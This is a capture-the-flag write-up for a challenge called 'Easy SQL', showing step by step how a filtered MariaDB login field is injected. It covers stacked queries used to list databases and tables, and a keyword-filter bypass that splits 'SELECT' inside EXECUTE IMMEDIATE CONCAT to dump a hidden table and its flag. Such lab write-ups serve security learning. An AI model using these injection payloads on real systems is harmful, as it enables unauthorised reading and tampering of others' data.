<hr />

<h2>description: 'Filtered MariaDB injection, stacked queries'</h2>

<h1>Easy SQL (200)</h1>

<h3>Basic Payload</h3>

<p><code>1' or '1'='1</code></p>

<p>```text
array(2) {
  [0]=&gt;
  string(1) "1"
  [1]=&gt;
  string(7) "hahahah"
}</p>

<p>array(2) {
  [0]=&gt;
  string(1) "2"
  [1]=&gt;
  string(12) "miaomiaomiao"
}</p>

<p>array(2) {
  [0]=&gt;
  string(6) "114514"
  [1]=&gt;
  string(2) "ys"
}
```</p>

<h3>Finding Number of Columns</h3>

<p><code>1' ORDER BY 2 -- -</code>: No error </p>

<p><code>1' ORDER BY 3 -- -</code>: error 1054 : Unknown column '3' in 'order clause'</p>

<p>So there are 2 columns</p>

<h3>Stacked Queries</h3>

<p>Many keywords, such as SELECT and UNION, are filtered out by regex. However, it appears stacked queries are allowed.</p>

<p><code>1'; SHOW DATABASES;</code></p>

<p>```text
array(1) {
  [0]=&gt;
  string(18) "information_schema"
}</p>

<p>array(1) {
  [0]=&gt;
  string(9) "supersqli"
}
```</p>

<p><code>1'; SHOW TABLES;</code></p>

<p>```text
array(1) {
  [0]=&gt;
  string(16) "1919810931114514"
}</p>

<p>array(1) {
  [0]=&gt;
  string(5) "words"
}
```</p>

<p><code>1'; DESCRIBE words;</code></p>

<p>```text
array(6) {
  [0]=&gt;
  string(2) "id"
  [1]=&gt;
  string(7) "int(11)"
  [2]=&gt;
  string(2) "NO"
  [3]=&gt;
  string(3) "PRI"
  [4]=&gt;
  NULL
  [5]=&gt;
  string(14) "auto_increment"
}</p>

<p>array(6) {
  [0]=&gt;
  string(4) "data"
  [1]=&gt;
  string(11) "varchar(20)"
  [2]=&gt;
  string(2) "NO"
  [3]=&gt;
  string(0) ""
  [4]=&gt;
  NULL
  [5]=&gt;
  string(0) ""
}
```</p>

<p><code>1'; DESCRIBE `1919810931114514`;</code></p>

<p><code>1'; USE information_schema; SHOW TABLES;</code></p>

<p><code>1'; SHOW PROCEDURE STATUS; SHOW FUNCTION STATUS;</code></p>

<h3>Execute Immediate</h3>

<p>Unlike MySQL, MariaDB supports the <code>EXECUTE IMMEDIATE</code> command which will execute a string as an SQL query.</p>

<p><code>1';EXECUTE IMMEDIATE CONCAT('SEL', 'ECT * FROM words');</code></p>

<p><code>1';EXECUTE IMMEDIATE CONCAT('SEL', 'ECT * FROM `1919810931114514`');</code></p>

<p>Note the backticks around 1919810931114514, they are needed to prevent the table name from being interpreted as a number.</p>

<p><code>text
array(1) {
  [0]=&gt;
  string(73) "DSO-NUS{427a3c725d559d066e010131695880665436761182ac104f72d6a5d70912c2e6}"
}
</code></p>
